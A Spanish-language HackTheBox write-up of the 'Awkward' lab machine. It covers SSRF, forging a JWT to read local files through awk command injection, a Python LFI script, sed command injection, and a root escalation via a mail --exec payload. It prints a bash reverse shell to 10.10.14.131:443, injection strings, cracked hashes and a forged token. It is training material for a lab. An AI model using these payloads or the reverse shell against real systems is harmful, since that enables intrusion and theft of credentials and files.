---
layout: single
title: Awkward - HackTheBox
excerpt: " Difficulty: Medium... The machine presents several technical challenges, including web application enumeration, exploiting an SSRF vulnerability, obtaining credentials and privilege escalation. Overall, 'Awkward' is a challenging machine that requires a combination of enumeration, research, scripting and exploitation skills to complete successfully. "
date: 2023-03-06
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-awkward/Awkward.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:
  - SSRF
  - LFI
  - Command Injection
  - JWT
  - API
  - Express
  - NodeJS
---

The machine presents several technical challenges, including web application enumeration, exploiting an SSRF vulnerability, obtaining credentials and privilege escalation. Overall, "Awkward" is a challenging machine that requires a combination of enumeration, research, scripting and exploitation skills to complete successfully.

# Summary
- IP: 10.10.11.185
- Ports: 22, 80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 8.9p1 Ubuntu 3
	-  80 -> nginx 1.18.0
<br><br>
# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.185 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,5000,8000 -sCV 10.10.11.185 -oN targeted
```

<br><br>
# Análisis de página web SUBDOMINIO (Port 80):

- Al acceder por el navegador a la página principal nos redirige a `"hat-valley.htb"`, lo agregamos a l "/etc/hosts":

- Hacemos búsqueda de `subdominios` con gobuster:

```bash
$gobuster vhost -u http://hat-valley.htb -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50
```

- Encontramos la dirección `"store.hat-valley.htb"`, la agregamos al "/etc/hosts" y accedemos.

- Al acceder nos pide credenciales, por el momento no contamos con ninguna así que seguimos `enumerando`.

<br><br>
# Análisis de página web PRINCIPAL (Port 80):


- Al acceder por el navegador nos redirige a "hat-valley.htb", lo agregamos a l "/etc/hosts" y recargamos la página.

- En la página principal vemos algo relacionado a la venta de artículos de moda, nada interesante; analizamos el código fuente y encontramos un recurso "/js/app.js", accedemos a este.

- Con ayuda de ChatGPT, creamos un comando en bash usando regex para analizar profundamente este recurso que encontramos, específicamente buscaremos posibles rutas que existan en el servidor:

```bash
$curl -s "http://hat-valley.htb/js/app.js" | grep -oE "/[a-z0-9_/-]{1,20}" | sed 's/\(\/[^\/]*\).*/\1/' | sort -u
```

- Dentro del output que nos arroja este comando, encontramos una ruta `"/dashboard"` la cual resulta sospechosa, la abrimos en el navegador.

- Nos redirige a la ruta `"/hr"` la cual también podemos observar en la respuesta del comando anteriormente ejecutado.

- Aquí nos encontramos con una página de login, necesitaremos credenciales válidas, así que seguimos enumerando.

- Dentro de la respuesta del comando anteriormente ejecutado, encontramos una ruta `"/api"`; deducimos que el servidor está ejecutando por detrás diversas apis y que alguna de estas podría contener información valiosa.

- De la misma forma, con ayuda de chatGPT creamos un comando en bash con regex para encontrar posibles archivos de API:

```bash
$curl -s "http://hat-valley.htb/js/app.js" | grep -oE "baseURL \+ '([^']+)" | cut -c 12-
```

#### Nota: En este caso, dado que de acuerdo al código fuente del recurso app.js podemos saber que está utilizando la librería "axios", nos centramos en la búsqueda del patrón típico en la que axios usa para hacer una solicitud GET a una URL que incluye la variable "baseURL" seguido del nombre de la función de la API.


- Obtenemos unos cuantos nombres de rutas de api, siendo `"staff-details"` el más sospechoso de contener información valiosa.

- Accededemos a este recurso de la api y leemos su contenido mediante un curl y JQ para mostrar la información de forma más presentable:

```bash
$curl -s "http://hat-valley.htb/api/staff-details" | jq
```

- Obtenemos varios `usuarios` con sus respectivos `hashes`, con "hash-identifier" identificamos el tipo de hash que es y los guardamos en un archivo "passwords".

- Intentamos crackear estos hashes con John:

```bash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt passwords --format=raw-SHA256
```

```js
Press 'q' or Ctrl-C to abort, almost any other key for status
chris123         (christopher.jones)
1g 0:00:00:01 DONE (2023-03-06 15:46) 0.7812g/s 11205Kp/s 11205Kc/s 33719KC/s -sevil2605-..*7¡Vamos!
```

- Encontramos la contraseña del usuario `"christopher.jones"`, la usamos para acceder en la página de login vista anteriormente.

- Dentro del dashboard no vemos nada interesante, sin embargo, vemos un hipervínculo `"refresh"` que al hacer click aparentemente no hace absolutamente nada, lo cual resulta sospechoso.

- Damos click en "refresh" interceptando la petición con Burpsuite.    

<br><br>

# Ataque SSRF:

- En Burpsuite, vemos que se hace una petición GET a `/api/store-status?url="http://store.hat-valley.htb"` lo que nos hace pensar en un posible `SSRF`, ya que apunta en este caso a una URL la cual podríamos `modificar`.

- Aprovechamos el `SSRF` para encontrar `puertos` internos que se estén usando dentro del sistema víctima; simplemente podemos usar un curl e iterar por un número considerablemente grande de puertos (no haremos todos ya que son demasiados):

- Para esto usaremos la herramienta "wfuzz" y un diccionario con el número de puertos que se van a iterar:

```bash
$wfuzz -c -u 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"' -w puertos --hh=0 -t 200
```

```js
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000080:   200        8 L      13 W       132 Ch      "80"                                                                                                                         
000003002:   200        685 L    5834 W     77002 Ch    "3002"                                                                                                                       
000008080:   200        54 L     163 W      2881 Ch     "8080"                                                                                                                       

Total time: 0
Processed Requests: 15000
Filtered Requests: 14997
Requests/sec.: 0
```

- Vemos el puerto 3002, accedemos a este mediante el ataque SSRF:

```bash
http://hat-valley.htb/api/store-status?url="http://localhost:3002"
```


- Podemos observar contenido acerca de la API de Hat Valley, es decir, de la página en cuestión, analizamos las funciones utilizadas.    

<br><br>

# Explotando JWT y LFI + Scripting en Python:

- Vemos que en la función "all-leave" se usa un método GET el cual en una parte del código ejecuta un:

```js
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr
```

- Podemos aprovecharnos de este comando `"awk"` para mostrar archivos locales del sistema, como el "/etc/passwd", para esto, deberíamos modificar el comando de forma que quede más o menos así:

```js
awk '//' /etc/passwd ' /' /var/www/private/leave_requests.csv
```

- Dado que el valor de la variable "user" pertenece a la información de la cookie `(JWT)`, podemos aprovecharnos para modificar y que se ajuste el comando al que queremos llegar.

- Primero, en la petición que habíamos hecho en Burpsuite copiamos la cookie la cual por su apariencia podemos saber que se trata de una `JWT`, la decodificamos en [JSON Web Tokens - jwt.io](https://jwt.io/) y podremos ver la información de esta JWT.

- Modificamos el username por " /' /etc/passwd  ' "

- Y para proseguir necesitamos la `firma secreta` del usuario en cuestión, la cual podríamos crackear con John.

```bash
$python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4MTM1NjkxfQ.uTXBwEo7PR-RAFkenpPHWvlC9HD6BmdKsdRXYsfNshI > /home/dante/HTB/Awkward/content/jwt.hash

$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt jwt.hash
```

```js
Press 'q' or Ctrl-C to abort, almost any other key for status
123beany123      (?)
1g 0:00:00:04 DONE (2023-03-06 16:39) 0.2004g/s 2672Kp/s 2672Kc/s 2672KC/s 123wau..1234ถ6789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

- Ya con la firma secreta podemos continuar generando la cookie en [JSON Web Tokens - jwt.io](https://jwt.io/) , pegamos la contraseña de firma secreta y tendremos generada la estructura de cookie que usaremos:

```js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzgxMzU2OTF9.VQjDx0VG4ZP4R6XOHAvKiGlNGiOqyEKJjd-5Q41bzQ0
```

- En el Repeater de Burpsuite, hacemos la petición GET a http://hat-valley.htb/api/all-leave pasándole como `cookie` la que hemos generado y deberíamos obtener el contenido del "/etc/passwd" confirmando así un LFI.

```js
GET /api/all-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzgxMzU2OTF9.VQjDx0VG4ZP4R6XOHAvKiGlNGiOqyEKJjd-5Q41bzQ0
Upgrade-Insecure-Requests: 1
```

- Para hacer este LFI mucho más cómodo y poder generar la cookie por cada archivo que quereamos buscar de forma automática, podríamos crear una `script en Python`:

```bash
$nano jwtLFI.py
```

```python
#!/usr/bin/python3

import sys, requests, jwt

if len(sys.argv) <2:
	print (f"\nUso: python3 {sys.argv[0]} <archivo a buscar>\n")
	print ("-d: Descargar archivo en el directorio actual\n")
	exit(1)

file = sys.argv[1]

#Definición de la función que se encarga de estructurar la cookie para convertirla en JWT
def makeCookieJWT(file= str) -> str:
	payload={"username":"/' {} '/".format(file), "iat": 1678135691}
	secret= "123beany123"
	token= jwt.encode(payload,secret)
	return token

#Uso de la función anteriormente definida y petición GET con la cookie creada para establecer el LFI
token = makeCookieJWT(file)
target = "http://hat-valley.htb/api/all-leave"
cookie = {"token":token}
request = requests.get(target, cookies=cookie)

#Descarga de archivo
try:
	if sys.argv[2] == '-d':
		with open(file.split("/")[-1].strip(),'wb') as f:
			f.write(request.content)

except:
    if request.text == "Failed to retrieve leave requests":
        print("\nNo se encontro el archivo\n")
        exit(1)
    else:
        print(request.text.strip())
```

- Usando esta script podemos hacer búsquedas típicas de LFI.

- Enumeramos usuarios:

```bash
$python3 jwtLFI.py /etc/passwd | grep "sh$"
```

```js
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

- Buscamos en el directorio del usuario "bean" su archivo `".bashrc"` para leer su contenido:

```bash
$python3 jwtLFI.py /home/bean/.bashrc
```

- Vemos en una parte de este archivo lo siguiente:

```js
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

- Parece ser que el usuario "bean" estableció un comando el cual hace una copia de seguridad de todo su home usando la script "backup_home.sh", accedemos a este archivo y leemos su contenido:

```bash
$python3 jwtLFI.py /home/bean/Documents/backup_home.sh
```

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```


- Analizando esta script, podemos saber que el backup del home del usuario "bean" se almacena en el directorio "/home/bean/Documents/backup/bean_backup_final.tar.gz" así que usando la script en python que creamos, `descargamos` dicho archivo:

```bash
$python3 jwtLFI.py /home/bean/Documents/backup/bean_backup_final.tar.gz -d
```

- Descomprimos por completo este archivo:

```bash
$tar -xzf bean_backup_final.tar.gz
$tar -xzf bean_backup.tar.gz
```

- Examinamos el directorio del usuario bean:

```bash
$tree -la
```

- Vemos un archivo interesante ".config/xpad/content-DS1ZS1" lo abrimos y encontramos una credencial.

- Accedemos por `SSH` como "bean" usando la credencial encontrada:

```bash
$ssh bean@10.10.11.185
```

- Hemos accedido al sistema y podremos leer la primera flag.    


<br><br>


# ESCALANDO PRIVILEGIOS:


- Probamos la credencial del usuario "bean" que encontramos para acceder como el usuario `"admin"` a la página del subdominio que al inicio encontramos.

- Por el momento no encontramos nada en el navegador; dentro de la máquina enumeramos los recursos de esta página web, ubicados en "/var/www/store".

- Encontramos un archivo llamado "cart_actions.php", lo cateamos y analizamos su contenido.

<br><br>
# Command Injection:

- En una parte del archivo vemos lo siguiente:

```js
//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}
```

- Vemos que en una parte del código se ejecuta en el sistema el comando `"sed"` seguido del argumento "item_id", esto lo podemos explotar ya que, teniendo acceso a la tienda (Subdominio al que accedimos) podremos elegir un artículo en particular y dentro de la máquina visualizar el id del item en cuestión y modificarlo a nuestra conveniencia.

- Primero, creamos un archivo `reverse shell` dentro del sistema de la máquina víctima:

```bash
$nano /tmp/shell.sh
```

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.131/443 0>&1

$chmod +x /tmp/shell.sh
```

- Luego, elegimos cualquier artículo de la página web y lo agregamos al carrito.

- Ahora, buscamos el `archivo` que se generó en el directorio "/var/www/store/cart"

- Dado que no tenemos permisos de escritura en el archivo que se generó, copiamos su contenido en un archivo que crearemos llamado "temp".

- Ahora eliminamos el archivo original y renombramos el archivo "temp" al que tenía el original.

- Modificamos el contenido del archivo para que el comando `"sed"` apunte a la reverse shell que acabamos de crear:

```js
***Hat Valley Cart***
item_id=2' -e "1e /tmp/shell.sh" /tmp/shell.sh '&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
```

- Ahora en la página de la tienda, nos vamos al `carrito` e intentamos eliminar el artículo, interceptando todo esto con Burpsuite.

- En los datos pasados por POST, modificamos para que el `"item_id"` haga lo mismo que le pusimos en el archivo, quedando de la siguiente forma:


```js
item=2'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&user=b936-968a-c77-259f&action=delete_item
```

- Ahora, al ejecutar la petición, si estamos en escucha en el puerto que establecimos recibirimos la reverse shell como el usuaario `"www-data"`.

- Enumeramos los procesos que se ejecutan en el sistema en segundo plano con [Pspy](https://github.com/DominicBreuker/pspy/releases) 

- Vemos lo siguiente:


```js
2023/03/07 10:20:01 CMD: UID=0     PID=12453  | /bin/bash /root/scripts/restore.sh 
2023/03/07 10:20:01 CMD: UID=0     PID=12456  | /usr/sbin/CRON -f -P 
2023/03/07 10:20:01 CMD: UID=0     PID=12457  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2023/03/07 10:20:01 CMD: UID=0     PID=12458  | mail -s Leave Request:  christine 
2023/03/07 10:20:01 CMD: UID=0     PID=12459  | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/03/07 10:20:01 CMD: UID=0     PID=12460  | cleanup -z -t unix -u -c 
2023/03/07 10:20:01 CMD: UID=0     PID=12461  | /usr/lib/postfix/sbin/master -w 
2023/03/07 10:20:01 CMD: UID=0     PID=12462  | /bin/bash /root/scripts/notify.sh 
2023/03/07 10:20:01 CMD: UID=0     PID=12466  | 
2023/03/07 10:20:01 CMD: UID=0     PID=12465  | 
2023/03/07 10:20:01 CMD: UID=0     PID=12463  | /bin/bash /root/scripts/notify.sh 
2023/03/07 10:20:01 CMD: UID=0     PID=12468  | mail -s Leave Request: bean.hill christine 
2023/03/07 10:20:01 CMD: UID=???   PID=12467  | ???
```

- Como se ve, se están mandando `mails` como "root", esto podríamos explotarlo de una forma contemplada en [mail | GTFOBins](https://gtfobins.github.io/gtfobins/mail/) , sin embargo, no sabemos el contenido que se está enviando en los emails ni de donde los está sacando.

- Si buscamos en el sistema, como el usuario "www-data" podremos acceder al directorio "/var/www/private", entramos y encontraremos un archivo `leave_requests.csv"`, curiosamente "leave_request" es el asunto en el que se ve que "root" manda los mails, entonces podemos suponer que el contenido de este archivo es el que se usa.

- Entonces, procedemos a explotar el uso de este servicio, modificando el archivo "leave_requests.csv" para que ejecute la reverse shell que ya creamos anteriormente:

```bash
$echo '" --exec="\!/tmp/shell.sh"' >> leave_requests.csv
```

- Y finalmente obtendremos una reverse shell como el usuario`"root"` y podremos leer la última flag.
